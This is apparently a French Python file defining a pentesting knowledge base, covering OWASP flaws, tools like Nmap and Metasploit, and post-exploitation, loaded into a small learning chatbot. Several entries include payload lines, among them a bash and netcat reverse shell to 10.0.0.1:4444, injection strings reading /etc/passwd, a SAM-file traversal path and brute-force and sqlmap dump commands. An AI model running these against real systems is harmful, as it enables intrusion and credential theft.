"""
Base de connaissances en cybersécurité et pentesting
"""

CYBER_KNOWLEDGE = {
    # OWASP Top 10
    "OWASP Top 10": """Les 10 vulnérabilités web les plus critiques:
1. Broken Access Control - Contrôle d'accès défaillant
2. Cryptographic Failures - Échecs cryptographiques
3. Injection - SQL, NoSQL, OS command injection
4. Insecure Design - Conception non sécurisée
5. Security Misconfiguration - Mauvaise configuration
6. Vulnerable Components - Composants vulnérables
7. Authentication Failures - Échecs d'authentification
8. Software and Data Integrity Failures
9. Security Logging Failures - Journalisation insuffisante
10. SSRF - Server-Side Request Forgery""",

    "SQL Injection": """Attaque qui injecte du code SQL malveillant dans une requête.
Exemple: ' OR '1'='1
Protection: Requêtes préparées, validation des entrées, ORM
Outils: sqlmap, Burp Suite
Test: ' OR 1=1--, admin'--""",

    "XSS Cross-Site Scripting": """Injection de JavaScript malveillant dans une page web.
Types: Reflected XSS, Stored XSS, DOM-based XSS
Exemple: <script>alert('XSS')</script>
Protection: Échappement HTML, Content Security Policy, validation
Outils: XSStrike, Burp Suite""",

    "CSRF Cross-Site Request Forgery": """Force un utilisateur authentifié à exécuter des actions non désirées.
Protection: Tokens CSRF, SameSite cookies, vérification Referer
Exemple: <img src="http://bank.com/transfer?to=attacker&amount=1000">""",

    "Command Injection": """Injection de commandes système dans une application.
Exemple: ; ls -la, && cat /etc/passwd
Protection: Validation stricte, éviter system(), utiliser des listes blanches
Test: ; whoami, | id, `uname -a`""",

    "Path Traversal": """Accès à des fichiers en dehors du répertoire autorisé.
Exemple: ../../etc/passwd, ..\\..\\windows\\system32\\config\\sam
Protection: Validation des chemins, chroot, permissions strictes""",

    # Pentesting
    "Pentesting": """Test d'intrusion pour identifier les vulnérabilités.
Phases: Reconnaissance, Scanning, Exploitation, Post-exploitation, Reporting
Méthodologies: OWASP, PTES, OSSTMM
Outils: Metasploit, Nmap, Burp Suite, Wireshark""",

    "Reconnaissance": """Phase de collecte d'informations sur la cible.
Passive: OSINT, Google Dorks, Shodan, theHarvester
Active: Nmap, DNS enumeration, port scanning
Outils: Maltego, Recon-ng, Amass, subfinder""",

    "Nmap": """Scanner de ports et de réseau.
Commandes:
- nmap -sS target : SYN scan (stealth)
- nmap -sV target : Détection de versions
- nmap -O target : Détection OS
- nmap -A target : Scan agressif complet
- nmap -p- target : Tous les ports""",

    "Metasploit": """Framework d'exploitation de vulnérabilités.
Commandes:
- msfconsole : Lancer Metasploit
- search exploit : Chercher un exploit
- use exploit/... : Sélectionner un exploit
- set RHOST target : Définir la cible
- exploit : Lancer l'attaque
Modules: exploits, payloads, auxiliary, post""",

    "Burp Suite": """Proxy d'interception pour tester les applications web.
Fonctionnalités:
- Proxy: Intercepter les requêtes HTTP
- Repeater: Modifier et renvoyer des requêtes
- Intruder: Attaques automatisées (brute force, fuzzing)
- Scanner: Détection automatique de vulnérabilités
- Decoder: Encoder/décoder des données""",

    "Wireshark": """Analyseur de paquets réseau.
Filtres utiles:
- http : Trafic HTTP
- tcp.port == 80 : Port 80
- ip.addr == 192.168.1.1 : IP spécifique
- http.request.method == "POST" : Requêtes POST
Analyse: Follow TCP Stream, Statistics""",

    # Exploitation
    "Reverse Shell": """Shell qui se connecte depuis la cible vers l'attaquant.
Bash: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
Python: python -c 'import socket...'
Netcat: nc -e /bin/bash 10.0.0.1 4444
Listener: nc -lvnp 4444""",

    "Privilege Escalation": """Élévation de privilèges pour obtenir root/admin.
Linux: SUID binaries, sudo misconfiguration, kernel exploits
Windows: UAC bypass, token impersonation, service exploits
Outils: LinPEAS, WinPEAS, GTFOBins, PEASS-ng""",

    "Brute Force": """Attaque par force brute pour deviner des credentials.
Outils:
- Hydra: hydra -l admin -P wordlist.txt ssh://target
- John the Ripper: john --wordlist=rockyou.txt hash.txt
- Hashcat: hashcat -m 0 -a 0 hash.txt wordlist.txt
- Medusa, Patator, CrackMapExec""",

    # Cryptographie
    "Cryptographie": """Science du chiffrement des données.
Symétrique: AES, DES, 3DES (même clé)
Asymétrique: RSA, ECC (clé publique/privée)
Hash: MD5, SHA-1, SHA-256, bcrypt
Outils: OpenSSL, GPG, hashcat, John""",

    "Hash": """Fonction à sens unique pour vérifier l'intégrité.
MD5: 128 bits (cassé, ne pas utiliser)
SHA-1: 160 bits (cassé)
SHA-256: 256 bits (sécurisé)
bcrypt: Pour les mots de passe (avec salt)
Cracking: hashcat, John the Ripper""",

    # Réseau
    "TCP/IP": """Protocoles de communication réseau.
Couches: Application, Transport, Internet, Accès réseau
TCP: Connexion fiable (3-way handshake)
UDP: Sans connexion, rapide
Ports: 80 (HTTP), 443 (HTTPS), 22 (SSH), 21 (FTP)""",

    "Firewall": """Filtre le trafic réseau entrant/sortant.
Types: Packet filtering, Stateful, Application layer
Linux: iptables, nftables, ufw
Windows: Windows Firewall
Bypass: Tunneling, fragmentation, port knocking""",

    # Outils Kali Linux
    "Kali Linux": """Distribution Linux pour le pentesting.
Outils préinstallés:
- Nmap, Metasploit, Burp Suite, Wireshark
- John, Hashcat, Hydra, Aircrack-ng
- SQLmap, Nikto, Dirb, Gobuster
- Social Engineering Toolkit, BeEF""",

    "Gobuster": """Scanner de répertoires et fichiers web.
Commandes:
- gobuster dir -u http://target -w wordlist.txt
- gobuster dns -d target.com -w subdomains.txt
- gobuster vhost -u http://target -w vhosts.txt
Wordlists: /usr/share/wordlists/""",

    "SQLmap": """Outil automatisé pour l'exploitation SQL injection.
Commandes:
- sqlmap -u "http://target?id=1" --dbs
- sqlmap -u "url" -D database --tables
- sqlmap -u "url" -D db -T table --dump
- sqlmap -r request.txt --batch""",

    # Web Security
    "HTTPS": """HTTP sécurisé avec TLS/SSL.
Certificats: X.509, Let's Encrypt
Attaques: Man-in-the-Middle, SSL stripping
Outils: SSLscan, testssl.sh, OpenSSL""",

    "JWT JSON Web Token": """Token d'authentification encodé en base64.
Structure: Header.Payload.Signature
Vulnérabilités: None algorithm, weak secret, no signature verification
Outils: jwt_tool, jwt.io""",

    "API Security": """Sécurisation des APIs REST/GraphQL.
Vulnérabilités: Broken authentication, excessive data exposure, injection
Protection: Rate limiting, authentication, validation, CORS
Outils: Postman, Insomnia, OWASP ZAP""",

    # Social Engineering
    "Social Engineering": """Manipulation psychologique pour obtenir des informations.
Techniques: Phishing, Pretexting, Baiting, Quid pro quo
Outils: SET (Social Engineering Toolkit), Gophish
Protection: Formation, sensibilisation, vérification""",

    "Phishing": """Faux emails/sites pour voler des credentials.
Types: Spear phishing (ciblé), Whaling (executives)
Outils: Gophish, SET, King Phisher
Protection: Vérifier l'expéditeur, ne pas cliquer sur les liens suspects""",

    # Post-Exploitation
    "Persistence": """Maintenir l'accès après exploitation.
Linux: Cron jobs, SSH keys, backdoors
Windows: Registry, scheduled tasks, services
Outils: Metasploit persistence modules, Empire""",

    "Lateral Movement": """Se déplacer dans le réseau après compromission.
Techniques: Pass-the-Hash, Pass-the-Ticket, RDP
Outils: Mimikatz, CrackMapExec, BloodHound, Impacket""",

    # CTF
    "CTF Capture The Flag": """Compétitions de hacking éthique.
Types: Jeopardy (challenges), Attack-Defense
Catégories: Web, Crypto, Forensics, Reverse, PWN
Plateformes: HackTheBox, TryHackMe, PicoCTF, CTFtime""",
}

def load_cyber_knowledge(ai):
    """Charge toutes les connaissances cyber dans l'IA"""
    print("🔐 Chargement de la base de connaissances cybersécurité...")
    
    for topic, content in CYBER_KNOWLEDGE.items():
        ai.learn(f"Qu'est-ce que {topic}?", content)
        print(f"  ✅ {topic}")
    
    print(f"\n✅ {len(CYBER_KNOWLEDGE)} connaissances chargées !")

if __name__ == '__main__':
    from brain import LearningAI
    
    ai = LearningAI('memory.json')
    load_cyber_knowledge(ai)
    
    print("\n📊 Statistiques:")
    stats = ai.stats()
    print(f"  Total connaissances: {stats.get('total_knowledge', 0)}")
